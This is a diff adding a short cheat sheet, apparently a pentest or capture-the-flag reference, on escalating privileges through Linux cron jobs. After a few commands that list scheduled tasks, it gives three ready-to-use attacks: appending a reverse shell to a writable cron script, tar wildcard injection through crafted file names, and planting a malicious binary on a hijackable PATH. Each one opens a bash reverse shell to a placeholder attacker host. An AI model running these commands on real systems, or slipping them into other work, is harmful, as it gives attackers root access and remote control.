@@ -1,0 +1,26 @@
+CRONTAB / SCHEDULED TASKS
+bash# Enumerate
+cat /etc/crontab
+cat /etc/cron.d/*
+cat /var/spool/cron/crontabs/*
+ls -la /etc/cron*
+crontab -l
+
+# Watch with pspy (see what runs)
+/tmp/pspy64
+
+# If cron runs a script you can write to:
+echo 'bash -i >& /dev/tcp/YOURIP/4444 0>&1' >> /path/to/script.sh
+
+# If cron uses wildcard in tar (tar wildcard injection)
+echo "" > /tmp/--checkpoint=1
+echo "" > /tmp/--checkpoint-action=exec=sh\ shell.sh
+echo "bash -i >& /dev/tcp/YOURIP/4444 0>&1" > /tmp/shell.sh
+# When tar runs: tar cf archive.tar /tmp/* → executes shell.sh
+
+# If cron runs script as root and PATH is hijackable
+echo $PATH
+# Create malicious binary at start of PATH
+echo '#!/bin/bash\nbash -i >& /dev/tcp/YOURIP/4444 0>&1' > /tmp/hijacked
+chmod +x /tmp/hijacked
+# export PATH=/tmp:$PATH  (if you can control env)
